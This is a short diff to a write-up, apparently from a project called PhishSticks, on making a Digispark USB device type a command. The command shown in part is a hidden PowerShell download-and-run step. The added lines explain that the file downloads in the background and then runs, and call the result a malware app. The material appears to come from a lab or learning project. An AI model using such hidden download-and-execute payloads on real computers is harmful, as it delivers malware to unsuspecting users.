@@ -138,6 +138,8 @@ powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https:/
 
 ![2023-10-11_23-04](https://github.com/therealhalonen/PhishSticks/assets/112076418/02a7b00a-7a83-4f37-91ed-fdb08ef66cf6)
 
+Pressing enter here executes the command and the download starts in the background. When its done, the program gets executed.
+
 To make this work with Digispark, I had to add some backslashes before the backslashes so that DigiKeyboard wont escape them, since they are needed for the command to work. Working code looks like following:
 
 ```
@@ -155,4 +157,4 @@ void loop() {
   exit(0);
 }
 ```
-One thing I noticed is that this method is much faster on getting the malware app to pop up than the previous one so I will update the files to this one.
+One thing I noticed is that this method is much faster on getting the malware app to pop up than the previous code from yesterday, so this going to be the one that we're going to use for this project.
